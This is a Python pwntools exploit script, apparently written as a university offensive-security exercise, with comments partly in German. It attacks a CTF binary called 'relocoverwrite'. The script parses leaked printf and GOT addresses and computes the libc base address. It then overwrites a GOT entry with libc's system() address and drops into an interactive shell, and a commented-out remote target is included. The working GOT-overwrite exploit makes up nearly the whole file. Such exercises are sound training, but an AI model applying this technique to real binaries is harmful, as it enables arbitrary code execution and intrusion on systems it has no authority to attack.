from pwn import *
# context.terminal = ["tmux", "split", "-h"]
# context.log_level = "debug" # shows payload

def main():
    # conn = context.binary = ELF('./relocoverwrite')
    conn = gdb.debug("./relocoverwrite", gdbscript="""break *0x{exe.symbols.main:x} continue""")
    # conn = remote('vuln.redrocket.club',7123)
    hh = context.binary = ELF('./relocoverwrite')
    ############ EXPLOIT GOES HERE ###############
    # Welcome to the overwrite-one-GOT-entry service!
    output = conn.recvline()
    # printf at: 0x7f6c12b34e80 GOT at: 0x563b48f45000
    output = conn.recvline()
    # decode from bytes to string
    output = output.decode("utf-8")
    print(output)

    # strategy

    # [*] '/home/fraewn/uni/offensive_security/exercises/week8/week8_klausur/relocoverwrite'
    #     Arch:     amd64-64-little
    #     RELRO:    Partial RELRO
    #     Stack:    Canary found --> brauch ich aber nicht, weil kein buffer overflow oder so hier noetig
    #     NX:       NX enabled --> stack not executable (rop or using got)
    #     PIE:      PIE enabled --> aslr is on

    # 1. printf adresse und got adresse raus lesen
    # 2. gucken welche libc verw. wird und base address finden
    # 3. system adresse raus finden
    # 4. an puts adresse im got die libc system() adresse schreiben

    # 1 printf, got address
    text = "f at: "
    printf_start_index = output.find(text) + len(text)
    printf= int(output[printf_start_index:printf_start_index + 14],16)
    log.info("Printf at %#x", printf)

    text = "T at: "
    got_start_index = output.find(text) + len(text)
    got = int(output[got_start_index:got_start_index+14],16)
    log.info("GOT at %#x", got)

    # 2 libc version and base address
    # lokal: libc_6_230
    # remote: libc_6_227

    libc = context.binary = ELF('./libc_6_230.so')
    # set libc base address as attribute in libc object
    libc.address = printf - libc.symbols["printf"]
    log.info("Libc at %#x", libc.address)

    # 3 libc system()
    system = libc.sym.system
    log.info("System at %#x", system)

    # flow
    output = conn.recvuntil(b'y!')

    # 4
    payload_entry = 3
    payload_address = p64(system)
    conn.sendline(str(payload_entry))
    conn.sendline(payload_address)

    ###########################################

    # open terminal
    conn.interactive()

if __name__ == "__main__":
    main()